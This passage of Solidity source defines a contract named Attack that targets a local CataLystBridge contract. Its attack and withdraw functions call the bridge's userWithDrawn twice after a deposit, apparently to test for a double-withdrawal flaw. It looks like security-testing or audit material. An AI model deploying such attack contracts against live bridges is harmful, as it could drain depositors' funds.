...
import "./CataLystBridge.sol";


contract Attack {
    address public catalystBridge;
    event Done(bool _isDone);
    
    receive() external payable {
            emit Done(true);
    }
    
    constructor(address _catalystBridge) public { 
        catalystBridge = _catalystBridge;
    }

    function deposit(uint _roundId) external payable {
        CataLystBridge(catalystBridge).userDeposit{value: msg.value}(_roundId);
    }

    function attack(uint _roundId) external payable {
        CataLystBridge(catalystBridge).userDeposit{value: msg.value}(_roundId);
        CataLystBridge(catalystBridge).userWithDrawn(_roundId);
    }

    function withdraw(uint _roundId) external {
        CataLystBridge(catalystBridge).userWithDrawn(_roundId);
        CataLystBridge(catalystBridge).userWithDrawn(_roundId);
    }
}
